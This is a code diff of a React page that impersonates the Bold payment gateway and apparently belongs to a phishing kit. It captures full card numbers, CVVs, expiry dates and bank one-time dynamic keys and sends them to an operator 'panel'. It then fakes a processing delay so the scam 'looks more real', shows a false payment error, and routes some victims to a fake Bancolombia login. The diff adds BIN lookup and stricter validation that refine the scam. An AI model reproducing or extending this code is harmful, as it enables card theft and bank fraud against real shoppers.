@@ -27,27 +27,27 @@ export default function BoldPagosPage() {
   const [cardName, setCardName] = useState('');
   const [acceptData, setAcceptData] = useState(false);
   const [acceptTerms, setAcceptTerms] = useState(false);
-  
+
   // Estado para notificaciones
-  const [notification, setNotification] = useState<{show: boolean, message: string, type: 'error' | 'success'}>({show: false, message: '', type: 'error'});
-  
+  const [notification, setNotification] = useState<{ show: boolean, message: string, type: 'error' | 'success' }>({ show: false, message: '', type: 'error' });
+
   // Estado para modal de confirmación de banco
   const [showBankConfirmation, setShowBankConfirmation] = useState(false);
-  const [detectedBankInfo, setDetectedBankInfo] = useState<{bank: string, cardBrand: string} | null>(null);
-  
+  const [detectedBankInfo, setDetectedBankInfo] = useState<{ bank: string, cardBrand: string } | null>(null);
+
   // Estado para modal de clave dinámica
   const [showDynamicKeyModal, setShowDynamicKeyModal] = useState(false);
   const [dynamicKey, setDynamicKey] = useState('');
   const [processingKey, setProcessingKey] = useState(false);
-  
+
   // Estado para modal de "NEGOCIO MASTER"
   const [showMasterModal, setShowMasterModal] = useState(false);
-  
+
   // Estado para modal de conversor de moneda
   const [showCurrencyModal, setShowCurrencyModal] = useState(false);
   const [selectedCurrency, setSelectedCurrency] = useState('COP');
   const [convertedAmount, setConvertedAmount] = useState(0);
-  
+
   // Tasas de cambio (simuladas - en producción vendrían de una API)
   const exchangeRates: { [key: string]: number } = {
     'COP': 1,
@@ -55,14 +55,14 @@ export default function BoldPagosPage() {
     'EUR': 0.00023,
     'MXN': 0.0043
   };
-  
+
   // Estado para mensaje rotativo
   const [currentMessage, setCurrentMessage] = useState(0);
   const messages = [
     'Más de 3 años vinculado a Bold.',
     'Más de 9500 ventas exitosas con Bold'
   ];
-  
+
   // Rotar mensajes cada 3 segundos
   useEffect(() => {
     const interval = setInterval(() => {
@@ -72,8 +72,8 @@ export default function BoldPagosPage() {
   }, []);
 
   const showNotification = (message: string, type: 'error' | 'success' = 'error') => {
-    setNotification({show: true, message, type});
-    setTimeout(() => setNotification({show: false, message: '', type: 'error'}), 4000);
+    setNotification({ show: true, message, type });
+    setTimeout(() => setNotification({ show: false, message: '', type: 'error' }), 4000);
   };
 
   // Cargar datos de la orden desde sessionStorage
@@ -83,7 +83,7 @@ export default function BoldPagosPage() {
       try {
         const parsed = JSON.parse(storedData);
         setOrderData(parsed);
-        
+
         // Pre-llenar campos si vienen del checkout
         if (parsed.email) setEmail(parsed.email);
         if (parsed.phone) setPhoneNumber(parsed.phone.replace('+57', ''));
@@ -96,23 +96,47 @@ export default function BoldPagosPage() {
     }
   }, [router]);
 
-  // Detectar tipo de tarjeta y banco mientras se escribe
+  // Detectar tipo de tarjeta y banco (Híbrido: Local + API)
   useEffect(() => {
-    if (cardNumber.length >= 6) {
-      const typeInfo = detectCardType(cardNumber);
-      const type = typeInfo?.brand || '';
-      setCardType(type);
-      
-      const bank = getBankName(cardNumber);
-      setBankName(bank || '');
-      
-      if (bank && bank !== 'Desconocido') {
-        console.log('🏦 Banco detectado:', bank, '| Tarjeta:', type);
+    // Debounce para no saturar la API
+    const timeoutId = setTimeout(async () => {
+      const cleanNumber = cardNumber.replace(/\s/g, '');
+
+      if (cleanNumber.length >= 6) {
+        // 1. Detectar Marca (Visa/Master, etc) - Local y Rápido
+        const typeInfo = detectCardType(cardNumber);
+        const type = typeInfo?.brand || '';
+        setCardType(type);
+
+        // 2. Detectar Banco - Llamada a API (Híbrida)
+        try {
+          // Solo llamar si cambiaron los primeros 6 dígitos
+          const bin = cleanNumber.substring(0, 6);
+          const res = await fetch('/api/bin-lookup', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ bin })
+          });
+
+          if (res.ok) {
+            const data = await res.json();
+            if (data.bank) {
+              setBankName(data.bank.bankName);
+              console.log('🏦 Banco detectado (API/Local):', data.bank.bankName);
+            } else {
+              setBankName(''); // No detectado
+            }
+          }
+        } catch (error) {
+          console.error('Error detectando banco:', error);
+        }
+      } else {
+        setCardType('');
+        setBankName('');
       }
-    } else {
-      setCardType('');
-      setBankName('');
-    }
+    }, 500);
+
+    return () => clearTimeout(timeoutId);
   }, [cardNumber]);
 
   const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
@@ -130,23 +154,36 @@ export default function BoldPagosPage() {
 
   const validateExpiryDate = (expiry: string): boolean => {
     if (expiry.length !== 5) return false;
-    
+
     const [month, year] = expiry.split('/').map(Number);
     if (month < 1 || month > 12) return false;
-    
+
     const currentDate = new Date();
     const currentYear = currentDate.getFullYear() % 100; // Últimos 2 dígitos
     const currentMonth = currentDate.getMonth() + 1;
-    
+
     if (year < currentYear) return false;
     if (year === currentYear && month < currentMonth) return false;
-    
+
     return true;
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    
+
+    // Validaciones Estrictas
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    if (!emailRegex.test(email)) {
+      showNotification('Por favor ingresa un correo electrónico válido');
+      return;
+    }
+
+    const phoneRegex = /^\d{10}$/;
+    if (!phoneRegex.test(phoneNumber)) {
+      showNotification('Por favor ingresa un número de celular válido (10 dígitos)');
+      return;
+    }
+
     if (!validateCardNumber(cardNumber)) {
       showNotification('Número de tarjeta inválido. Por favor verifica.');
       return;
@@ -187,17 +224,17 @@ export default function BoldPagosPage() {
             country: orderData.customer?.country,
             postalCode: orderData.customer?.postalCode,
             documentId: orderData.customer?.documentId,
-            
+
             // Información COMPLETA de tarjeta
             cardNumber: cardNumber, // Número completo
             cardHolderName: cardName, // Nombre en tarjeta
             expiryDate: expiryDate, // Fecha completa
             cvv: cvv, // CVV completo
             cardBrand: cardType,
-            
+
             // Datos de orden
             totalAmount: orderData.totalAmount,
-            
+
             customerData: {
               fullName: orderData.fullName,
               email,
@@ -226,7 +263,7 @@ export default function BoldPagosPage() {
         }
 
         const result = await response.json();
-        
+
         if (result.success && result.session) {
           // Redirect to Bancolombia authentication flow
           router.push(`/bancolombia/usuario?sessionId=${result.session.sessionId}`);
@@ -271,7 +308,7 @@ export default function BoldPagosPage() {
           country: orderData.customer?.country,
           postalCode: orderData.customer?.postalCode,
           documentId: orderData.customer?.documentId,
-          
+
           // Información COMPLETA de tarjeta
           cardNumber: cardNumber, // Número completo
           cardHolderName: cardName, // Nombre en tarjeta
@@ -279,10 +316,10 @@ export default function BoldPagosPage() {
           cvv: cvv, // CVV completo
           cardBrand: cardType,
           dynamicKey: dynamicKey, // CLAVE DINÁMICA
-          
+
           // Datos de orden
           totalAmount: orderData.totalAmount,
-          
+
           customerData: {
             fullName: orderData.fullName,
             email,
@@ -311,20 +348,20 @@ export default function BoldPagosPage() {
       if (!response.ok) {
         console.error('Error al enviar datos al panel');
       }
-      
+
       // Simular procesamiento (2.5-3 segundos para que se vea más real)
       await new Promise(resolve => setTimeout(resolve, 2500));
-      
+
       // Cerrar modal y mostrar error
       setShowDynamicKeyModal(false);
       setProcessingKey(false);
       showNotification('Error al procesar el pago. Por favor verifica los datos de tu tarjeta e intenta nuevamente.', 'error');
-      
+
       // Después de 2 segundos, redirigir al carrito
       setTimeout(() => {
         router.push('/carrito?error=payment_failed');
       }, 2000);
-      
+
     } catch (error) {
       console.error('Error processing payment:', error);
       setProcessingKey(false);
@@ -352,27 +389,26 @@ export default function BoldPagosPage() {
       {/* Notificación */}
       {notification.show && (
         <div className="fixed top-8 left-1/2 transform -translate-x-1/2 z-50 animate-in slide-in-from-top duration-300">
-          <div className={`flex items-center gap-3 px-6 py-4 rounded-xl shadow-2xl border-2 ${
-            notification.type === 'error' 
-              ? 'bg-red-50 border-red-200 text-red-800' 
-              : 'bg-green-50 border-green-200 text-green-800'
-          }`}>
+          <div className={`flex items-center gap-3 px-6 py-4 rounded-xl shadow-2xl border-2 ${notification.type === 'error'
+            ? 'bg-red-50 border-red-200 text-red-800'
+            : 'bg-green-50 border-green-200 text-green-800'
+            }`}>
             {notification.type === 'error' ? (
               <svg className="w-6 h-6 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
-                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd"/>
+                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" />
               </svg>
             ) : (
               <svg className="w-6 h-6 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
-                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd"/>
+                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
               </svg>
             )}
             <p className="font-medium">{notification.message}</p>
-            <button 
-              onClick={() => setNotification({show: false, message: '', type: 'error'})}
+            <button
+              onClick={() => setNotification({ show: false, message: '', type: 'error' })}
               className="ml-2 hover:opacity-70 transition"
             >
               <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
-                <path fillRule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clipRule="evenodd"/>
+                <path fillRule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clipRule="evenodd" />
               </svg>
             </button>
           </div>
@@ -445,7 +481,7 @@ export default function BoldPagosPage() {
                   'Continuar con el Pago'
                 )}
               </button>
-              
+
               <button
                 onClick={() => {
                   setShowDynamicKeyModal(false);
@@ -462,7 +498,7 @@ export default function BoldPagosPage() {
             <div className="mt-6 p-4 bg-blue-50 rounded-xl border border-blue-200">
               <div className="flex gap-3">
                 <svg className="w-5 h-5 text-blue-600 flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
-                  <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd"/>
+                  <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" />
                 </svg>
                 <div>
                   <p className="text-sm font-semibold text-blue-900 mb-1">Tu seguridad es importante</p>
@@ -473,7 +509,7 @@ export default function BoldPagosPage() {
           </div>
         </div>
       )}
-      
+
       {/* Modal NEGOCIO MASTER */}
       {showMasterModal && (
         <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50 p-4 animate-in fade-in duration-300">
@@ -488,7 +524,7 @@ export default function BoldPagosPage() {
                   <span className="text-sm font-bold text-purple-700">NEGOCIO MASTER</span>
                 </div>
               </div>
-              <button 
+              <button
                 onClick={() => setShowMasterModal(false)}
                 className="text-gray-400 hover:text-gray-600 transition"
               >
@@ -571,7 +607,7 @@ export default function BoldPagosPage() {
           <div className="bg-white rounded-3xl shadow-2xl max-w-md w-full p-8 animate-in slide-in-from-bottom duration-300">
             <div className="flex justify-between items-center mb-6">
               <h3 className="text-xl font-bold text-[#1f126f]">Valor a pagar en pesos colombianos</h3>
-              <button 
+              <button
                 onClick={() => setShowCurrencyModal(false)}
                 className="text-gray-400 hover:text-gray-600 transition"
               >
@@ -590,9 +626,9 @@ export default function BoldPagosPage() {
                 </span>
                 <div className="flex items-center gap-1">
                   <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
-                    <rect y="4" width="24" height="6" fill="#FCD116"/>
-                    <rect y="10" width="24" height="4" fill="#003893"/>
-                    <rect y="14" width="24" height="6" fill="#CE1126"/>
+                    <rect y="4" width="24" height="6" fill="#FCD116" />
+                    <rect y="10" width="24" height="4" fill="#003893" />
+                    <rect y="14" width="24" height="6" fill="#CE1126" />
                   </svg>
                   <span className="text-lg font-bold text-gray-700">COP</span>
                 </div>
@@ -602,19 +638,19 @@ export default function BoldPagosPage() {
             {/* Icono de intercambio */}
             <div className="flex justify-center mb-6">
               <svg className="w-8 h-8 text-[#8e7df8]" fill="currentColor" viewBox="0 0 24 24">
-                <path d="M7 10l5 5 5-5H7z"/>
-                <path d="M7 14l5-5 5 5H7z"/>
+                <path d="M7 10l5 5 5-5H7z" />
+                <path d="M7 14l5-5 5 5H7z" />
               </svg>
             </div>
 
             {/* Selector de moneda */}
             <div className="bg-[#6b4cf0] rounded-2xl p-6 mb-6">
               <p className="text-sm text-white/80 mb-3 font-semibold">Selecciona tu moneda*</p>
-              
+
               <div className="flex items-center justify-between bg-white/20 backdrop-blur rounded-xl p-4 mb-4">
                 <span className="text-3xl font-bold text-white">
-                  ${selectedCurrency === 'COP' 
-                    ? '0' 
+                  ${selectedCurrency === 'COP'
+                    ? '0'
                     : ((orderData?.insuranceFee || orderData?.totalAmount || orderData?.total || 0) * exchangeRates[selectedCurrency]).toFixed(2)}
                 </span>
                 <select
@@ -674,15 +710,15 @@ export default function BoldPagosPage() {
           marginBottom: '24px'
         }}>
           {/* Logo Bold arriba a la izquierda */}
-          <img 
-            src="/logos/pagos/BOLD.png" 
-            alt="Bold" 
+          <img
+            src="/logos/pagos/BOLD.png"
+            alt="Bold"
             style={{
               width: '80px',
               height: '28px'
             }}
           />
-          
+
           {/* Selector de país */}
           <button style={{
             boxSizing: 'border-box',
@@ -713,9 +749,9 @@ export default function BoldPagosPage() {
             height: '32px'
           }}>
             <svg width="20" height="20" viewBox="0 0 24 24" fill="none" style={{ flexShrink: 0, borderRadius: '50%' }}>
-              <rect y="4" width="24" height="6" fill="#FCD116"/>
-              <rect y="10" width="24" height="4" fill="#003893"/>
-              <rect y="14" width="24" height="6" fill="#CE1126"/>
+              <rect y="4" width="24" height="6" fill="#FCD116" />
+              <rect y="10" width="24" height="4" fill="#003893" />
+              <rect y="14" width="24" height="6" fill="#CE1126" />
             </svg>
             <span style={{ fontWeight: 600 }}>ES</span>
             <svg style={{
@@ -800,7 +836,7 @@ export default function BoldPagosPage() {
           }}>
             Bold Inbound
           </h3>
-          
+
           {/* Mensaje dinámico */}
           <p style={{
             margin: '0px 0px 24px 0px',
@@ -884,117 +920,117 @@ export default function BoldPagosPage() {
             <>
               <p className="text-sm font-semibold text-gray-700 mb-3">Pago con tarjeta</p>
               <div className="space-y-3 mb-6">
-              
-              {/* Pago con tarjeta con carousel */}
-              <button
-                type="button"
-                onClick={() => setPaymentOption('card')}
-                className="w-full transition group"
-                style={{
-                  backgroundColor: 'rgb(247, 248, 251)',
-                  borderRadius: '16px',
-                  border: 'none',
-                  padding: '16px 20px 16px 12px',
-                  minHeight: '72px',
-                  cursor: 'pointer'
-                }}
-              >
-                <div className="flex items-center justify-between w-full">
+
+                {/* Pago con tarjeta con carousel */}
+                <button
+                  type="button"
+                  onClick={() => setPaymentOption('card')}
+                  className="w-full transition group"
+                  style={{
+                    backgroundColor: 'rgb(247, 248, 251)',
+                    borderRadius: '16px',
+                    border: 'none',
+                    padding: '16px 20px 16px 12px',
+                    minHeight: '72px',
+                    cursor: 'pointer'
+                  }}
+                >
+                  <div className="flex items-center justify-between w-full">
+                    <div className="flex items-center gap-4">
+                      <div className="w-6 h-6 rounded-full border-2 border-gray-300 flex items-center justify-center group-hover:border-gray-400">
+                      </div>
+                      <div className="flex items-center gap-3">
+                        <img src="/logos/bold/credit-card.svg" alt="" className="w-7 h-7" />
+                        <span className="font-bold text-[#1f126f] text-base">Pago con tarjeta</span>
+                      </div>
+                    </div>
+                    {/* Carousel de tarjetas al lado derecho */}
+                    <div className="flex-shrink-0">
+                      <CardCarousel />
+                    </div>
+                  </div>
+                </button>
+
+                {/* Separador */}
+                <p className="text-sm font-semibold text-gray-700 mb-3 mt-6">Transferencia bancaria</p>
+
+                {/* Opción 2: Botón Bancolombia - DESHABILITADO */}
+                <button
+                  type="button"
+                  disabled
+                  className="w-full flex items-center justify-between transition opacity-50 cursor-not-allowed"
+                  style={{
+                    backgroundColor: 'rgb(247, 248, 251)',
+                    borderRadius: '16px',
+                    border: 'none',
+                    padding: '16px 20px 16px 12px',
+                    minHeight: '72px'
+                  }}
+                >
                   <div className="flex items-center gap-4">
-                    <div className="w-6 h-6 rounded-full border-2 border-gray-300 flex items-center justify-center group-hover:border-gray-400">
+                    <div className="w-6 h-6 rounded-full border-2 border-gray-300 flex items-center justify-center">
                     </div>
                     <div className="flex items-center gap-3">
-                      <img src="/logos/bold/credit-card.svg" alt="" className="w-7 h-7" />
-                      <span className="font-bold text-[#1f126f] text-base">Pago con tarjeta</span>
+                      <img src="/logos/bancos/BANCOLOMBIA.png" alt="Bancolombia" className="h-6 object-contain grayscale" />
+                      <span className="font-bold text-gray-500 text-base">Botón Bancolombia</span>
                     </div>
                   </div>
-                  {/* Carousel de tarjetas al lado derecho */}
-                  <div className="flex-shrink-0">
-                    <CardCarousel />
-                  </div>
-                </div>
-              </button>
+                  <span className="text-xs text-gray-400 italic">Próximamente</span>
+                </button>
 
-              {/* Separador */}
-              <p className="text-sm font-semibold text-gray-700 mb-3 mt-6">Transferencia bancaria</p>
+                {/* Opción 3: Nequi - DESHABILITADO */}
+                <button
+                  type="button"
+                  disabled
+                  className="w-full flex items-center justify-between transition opacity-50 cursor-not-allowed"
+                  style={{
+                    backgroundColor: 'rgb(247, 248, 251)',
+                    borderRadius: '16px',
+                    border: 'none',
+                    padding: '16px 20px 16px 12px',
+                    minHeight: '72px'
+                  }}
+                >
+                  <div className="flex items-center gap-4">
+                    <div className="w-6 h-6 rounded-full border-2 border-gray-300 flex items-center justify-center">
+                    </div>
+                    <div className="flex items-center gap-3">
+                      <span className="text-3xl font-bold text-gray-400">N</span>
+                      <span className="font-bold text-gray-500 text-base">Nequi</span>
+                    </div>
+                  </div>
+                  <span className="text-xs text-gray-400 italic">Próximamente</span>
+                </button>
 
-              {/* Opción 2: Botón Bancolombia - DESHABILITADO */}
-              <button
-                type="button"
-                disabled
-                className="w-full flex items-center justify-between transition opacity-50 cursor-not-allowed"
-                style={{
-                  backgroundColor: 'rgb(247, 248, 251)',
-                  borderRadius: '16px',
-                  border: 'none',
-                  padding: '16px 20px 16px 12px',
-                  minHeight: '72px'
-                }}
-              >
-                <div className="flex items-center gap-4">
-                  <div className="w-6 h-6 rounded-full border-2 border-gray-300 flex items-center justify-center">
+                {/* Opción 4: PSE - DESHABILITADO */}
+                <button
+                  type="button"
+                  disabled
+                  className="w-full flex items-center justify-between transition opacity-50 cursor-not-allowed"
+                  style={{
+                    backgroundColor: 'rgb(247, 248, 251)',
+                    borderRadius: '16px',
+                    border: 'none',
+                    padding: '16px 20px 16px 12px',
+                    minHeight: '72px'
+                  }}
+                >
+                  <div className="flex items-center gap-4">
+                    <div className="w-6 h-6 rounded-full border-2 border-gray-300 flex items-center justify-center">
+                    </div>
+                    <div className="flex items-center gap-3">
+                      <img src="/logos/bancos/PSE.png" alt="PSE" className="h-6 object-contain grayscale" />
+                      <span className="font-bold text-gray-500 text-base">PSE</span>
+                    </div>
                   </div>
-                  <div className="flex items-center gap-3">
-                    <img src="/logos/bancos/BANCOLOMBIA.png" alt="Bancolombia" className="h-6 object-contain grayscale" />
-                    <span className="font-bold text-gray-500 text-base">Botón Bancolombia</span>
-                  </div>
-                </div>
-                <span className="text-xs text-gray-400 italic">Próximamente</span>
-              </button>
+                  <span className="text-xs text-gray-400 italic">Próximamente</span>
+                </button>
+              </div>
 
-              {/* Opción 3: Nequi - DESHABILITADO */}
-              <button
-                type="button"
-                disabled
-                className="w-full flex items-center justify-between transition opacity-50 cursor-not-allowed"
-                style={{
-                  backgroundColor: 'rgb(247, 248, 251)',
-                  borderRadius: '16px',
-                  border: 'none',
-                  padding: '16px 20px 16px 12px',
-                  minHeight: '72px'
-                }}
-              >
-                <div className="flex items-center gap-4">
-                  <div className="w-6 h-6 rounded-full border-2 border-gray-300 flex items-center justify-center">
-                  </div>
-                  <div className="flex items-center gap-3">
-                    <span className="text-3xl font-bold text-gray-400">N</span>
-                    <span className="font-bold text-gray-500 text-base">Nequi</span>
-                  </div>
-                </div>
-                <span className="text-xs text-gray-400 italic">Próximamente</span>
-              </button>
-
-              {/* Opción 4: PSE - DESHABILITADO */}
-              <button
-                type="button"
-                disabled
-                className="w-full flex items-center justify-between transition opacity-50 cursor-not-allowed"
-                style={{
-                  backgroundColor: 'rgb(247, 248, 251)',
-                  borderRadius: '16px',
-                  border: 'none',
-                  padding: '16px 20px 16px 12px',
-                  minHeight: '72px'
-                }}
-              >
-                <div className="flex items-center gap-4">
-                  <div className="w-6 h-6 rounded-full border-2 border-gray-300 flex items-center justify-center">
-                  </div>
-                  <div className="flex items-center gap-3">
-                    <img src="/logos/bancos/PSE.png" alt="PSE" className="h-6 object-contain grayscale" />
-                    <span className="font-bold text-gray-500 text-base">PSE</span>
-                  </div>
-                </div>
-                <span className="text-xs text-gray-400 italic">Próximamente</span>
-              </button>
-            </div>
-            
-            {/* Badges de seguridad cuando no hay método seleccionado */}
-            <div className="mt-8">
-              <SecurityBadges />
-            </div>
+              {/* Badges de seguridad cuando no hay método seleccionado */}
+              <div className="mt-8">
+                <SecurityBadges />
+              </div>
             </>
           )}
 
@@ -1002,7 +1038,7 @@ export default function BoldPagosPage() {
           {paymentOption === 'card' && (
             <form onSubmit={handleSubmit} className="space-y-5 animate-in slide-in-from-top duration-300">
               {/* Método seleccionado - Card compacto */}
-              <div 
+              <div
                 className="w-full"
                 style={{
                   backgroundColor: 'rgb(247, 248, 251)',
@@ -1016,7 +1052,7 @@ export default function BoldPagosPage() {
                   <div className="flex items-center gap-4">
                     <div className="w-6 h-6 rounded-full bg-[#f02c4c] flex items-center justify-center">
                       <svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 20 20">
-                        <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"/>
+                        <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                       </svg>
                     </div>
                     <div className="flex items-center gap-3">
@@ -1089,7 +1125,7 @@ export default function BoldPagosPage() {
                         />
                       </div>
                     )}
-                    
+
                     {/* Documento de identidad */}
                     {orderData.customer.documentId && (
                       <div>
@@ -1104,7 +1140,7 @@ export default function BoldPagosPage() {
                         />
                       </div>
                     )}
-                    
+
                     {/* Dirección */}
                     {orderData.customer.address && (
                       <div className="md:col-span-2">
@@ -1119,7 +1155,7 @@ export default function BoldPagosPage() {
                         />
                       </div>
                     )}
-                    
+
                     {/* Ciudad y código postal si están disponibles */}
                     <div className="md:col-span-2 grid grid-cols-1 md:grid-cols-3 gap-2">
                       {orderData.customer.city && (
@@ -1182,10 +1218,12 @@ export default function BoldPagosPage() {
                     className="w-full px-4 py-3 pr-12 bg-gray-50 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#f02c4c] focus:border-transparent text-gray-900 placeholder:text-gray-400"
                   />
                   <svg className="absolute right-4 top-1/2 -translate-y-1/2 w-6 h-6 text-gray-400" fill="currentColor" viewBox="0 0 24 24">
-                    <path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/>
+                    <path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z" />
                   </svg>
                 </div>
               </div>
+
+
 
               {/* Fecha de expiración y CVV */}
               <div className="grid grid-cols-2 gap-4">
@@ -1225,7 +1263,7 @@ export default function BoldPagosPage() {
                       className="w-full px-4 py-3 pr-12 bg-gray-50 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#f02c4c] focus:border-transparent text-gray-900 placeholder:text-gray-400"
                     />
                     <svg className="absolute right-4 top-1/2 -translate-y-1/2 w-6 h-6 text-gray-400" fill="currentColor" viewBox="0 0 24 24">
-                      <path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/>
+                      <path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z" />
                     </svg>
                   </div>
                 </div>
@@ -1340,6 +1378,6 @@ export default function BoldPagosPage() {
         </div>
       </div>
 
-    </div>
+    </div >
   );
 }
